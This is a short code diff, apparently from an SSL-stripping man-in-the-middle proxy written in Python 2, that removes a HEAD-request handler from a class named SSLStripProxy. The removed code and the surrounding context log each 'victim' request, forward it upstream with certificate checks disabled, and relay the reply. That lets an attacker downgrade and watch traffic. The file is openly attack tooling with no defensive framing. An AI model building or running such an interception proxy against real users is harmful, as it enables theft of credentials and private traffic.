@@ -81,39 +81,7 @@ class SSLStripProxy(BaseHTTPRequestHandler):
 
         except Exception as e:
             self.send_error(502, "SSLStrip failed: {}".format(e))
-
-
-    def do_HEAD(self):
-        host = self.headers.getheader('Host', '')
-        url = "https://{}{}".format(host, self.path)
-        print "[+] Victim sent HEAD request:", url
-
-        try:
-            parsed = urlparse.urlparse(url)
-            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
-            path = parsed.path or "/"
-            if parsed.query:
-                path += "?" + parsed.query
-
-            headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Accept": "*/*",
-                "Accept-Encoding": "identity",
-                "Host": host
-            }
-
-            conn.request("HEAD", path, headers=headers)
-            resp = conn.getresponse()
-            content_type = resp.getheader('Content-Type', 'text/html')
-            content_length = resp.getheader('Content-Length', '0')
-
-            self.send_response(resp.status)
-            self.send_header("Content-type", content_type)
-            self.send_header("Content-Length", content_length)
-            self.end_headers()
-
-        except Exception as e:
-            self.send_error(502, "SSLStrip failed (HEAD): {}".format(e))
+            
 
     def do_POST(self):
         host = self.headers.getheader('Host', '')
